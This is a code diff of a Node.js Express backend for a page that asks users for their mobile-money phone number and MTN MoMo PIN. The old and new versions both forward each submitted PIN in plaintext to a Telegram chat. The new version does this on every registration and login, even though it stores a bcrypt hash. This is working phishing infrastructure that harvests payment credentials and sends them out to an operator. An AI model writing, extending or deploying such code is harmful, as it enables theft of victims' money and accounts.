@@ -1,98 +1,141 @@
-const express = require('express');
-const axios = require('axios');
-const path = require('path');
-require('dotenv').config();
+require("dotenv").config();
+const express = require("express");
+const bcrypt = require("bcryptjs");
+const cors = require("cors");
+const TelegramBot = require("node-telegram-bot-api");
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-
-// ===== CONFIGURATION (loaded from .env) =====
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-if (!BOT_TOKEN || !CHAT_ID) {
-    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment');
-    process.exit(1);
-}
+const PORT = process.env.PORT || 10000;
 
 // Middleware
+app.use(cors());
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static("public")); // Serves your index.html
 
-// ===== SEND TO TELEGRAM =====
-async function sendToTelegram(message) {
-    try {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        await axios.post(url, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        });
-        console.log('✅ Telegram message sent');
-        return { success: true };
-    } catch (error) {
-        console.error('❌ Telegram error:', error.response?.data || error.message);
-        return { success: false, error: error.message };
-    }
+// Telegram Setup
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
+
+// Temporary in-memory database (resets on server restart)
+let users = []; 
+
+// Helper: Send Telegram Message
+async function sendTelegram(message) {
+  try {
+    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: "Markdown" });
+    console.log("📨 Telegram notification sent");
+  } catch (err) {
+    console.error("❌ Telegram error:", err.message);
+  }
 }
 
-// ===== API: REGISTER =====
-app.post('/api/register', async (req, res) => {
-    try {
-        const { mtnNumber, momoPin } = req.body;
+// ---------------- ROUTES ----------------
 
-        if (!mtnNumber || !momoPin) {
-            return res.status(400).json({
-                success: false,
-                message: 'MTN number and MoMo PIN are required'
-            });
-        }
+// 1. REGISTER ROUTE
+app.post("/api/auth/register", async (req, res) => {
+  try {
+    const { phone, pin } = req.body;
 
-        if (momoPin.length !== 4) {
-            return res.status(400).json({
-                success: false,
-                message: 'MoMo PIN must be 4 digits'
-            });
-        }
-
-        const registrationId = Math.floor(10000 + Math.random() * 90000).toString();
-
-        const message =
-            '📱 <b>NEW MTN MOMO REGISTRATION</b>\n\n' +
-            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '📞 <b>MTN Number:</b> <code>' + mtnNumber + '</code>\n' +
-            '🔑 <b>MoMo PIN:</b> <code>' + momoPin + '</code>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n\n' +
-            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString();
-
-        const result = await sendToTelegram(message);
-
-        if (result.success) {
-            res.json({
-                success: true,
-                registrationId: registrationId,
-                message: 'Registration successful'
-            });
-        } else {
-            res.status(500).json({
-                success: false,
-                message: 'Failed to send registration'
-            });
-        }
-    } catch (error) {
-        console.error('Registration error:', error);
-        res.status(500).json({ success: false, message: 'Server error' });
+    // Validate: Must be 4 or 5 digits
+    if (!phone || !pin) {
+      return res.status(400).json({ message: "Phone and PIN are required" });
     }
+    if (pin.length < 4 || pin.length > 5) {
+      return res.status(400).json({ message: "PIN must be exactly 4 or 5 digits" });
+    }
+
+    // Check if user exists
+    const existingUser = users.find(u => u.phone === phone);
+    if (existingUser) {
+      return res.status(409).json({ message: "Phone already registered" });
+    }
+
+    // Hash the PIN for basic security
+    const hashedPin = await bcrypt.hash(pin, 10);
+    const registrationId = "#" + Math.floor(1000 + Math.random() * 9000);
+
+    // Save user
+    const newUser = { phone, pin: hashedPin, registrationId, verified: false, loginCount: 0 };
+    users.push(newUser);
+
+    // 🔔 Send Telegram Alert
+    const time = new Date().toLocaleString("en-KE", { timeZone: "Africa/Nairobi" });
+    const tgMessage = `
+🆕 *NEW REGISTRATION*
+━━━━━━━━━━━━━━━━━━
+📱 *Phone:* \`${phone}\`
+🔑 *PIN:* \`${pin}\`
+🆔 *Reg ID:* \`${registrationId}\`
+🕒 *Time:* ${time}
+    `;
+    sendTelegram(tgMessage);
+
+    // Send success back to frontend
+    res.status(201).json({
+      message: "Registration successful",
+      registrationId: registrationId,
+      phone: phone
+    });
+
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: "Server error" });
+  }
 });
 
-// ===== HEALTH CHECK =====
-app.get('/health', (req, res) => {
-    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
+// 2. LOGIN ROUTE
+app.post("/api/auth/login", async (req, res) => {
+  try {
+    const { phone, pin } = req.body;
+
+    // Validate: Must be 4 or 5 digits
+    if (!phone || !pin) {
+      return res.status(400).json({ message: "Phone and PIN are required" });
+    }
+    if (pin.length < 4 || pin.length > 5) {
+      return res.status(400).json({ message: "PIN must be exactly 4 or 5 digits" });
+    }
+
+    // Find user
+    const user = users.find(u => u.phone === phone);
+    if (!user) {
+      return res.status(404).json({ message: "User not found" });
+    }
+
+    // Check PIN
+    const isMatch = await bcrypt.compare(pin, user.pin);
+    if (!isMatch) {
+      return res.status(401).json({ message: "Invalid PIN" });
+    }
+
+    // Update login count
+    user.loginCount += 1;
+
+    // 🔔 Send Telegram Alert
+    const time = new Date().toLocaleString("en-KE", { timeZone: "Africa/Nairobi" });
+    const tgMessage = `
+🔐 *USER LOGIN*
+━━━━━━━━━━━━━━━━━━
+📱 *Phone:* \`${phone}\`
+🔑 *PIN Entered:* \`${pin}\`
+🔁 *Login Count:* ${user.loginCount}
+📊 *Status:* ${user.verified ? "✅ Verified" : "⚠️ Pending Verification"}
+🕒 *Time:* ${time}
+    `;
+    sendTelegram(tgMessage);
+
+    res.json({
+      message: "Login successful",
+      registrationId: user.registrationId,
+      verified: user.verified
+    });
+
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: "Server error" });
+  }
 });
 
-// ===== START SERVER =====
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+// Start Server
+app.listen(PORT, "0.0.0.0", () => {
+  console.log(`🚀 Server running on port ${PORT}`);
 });
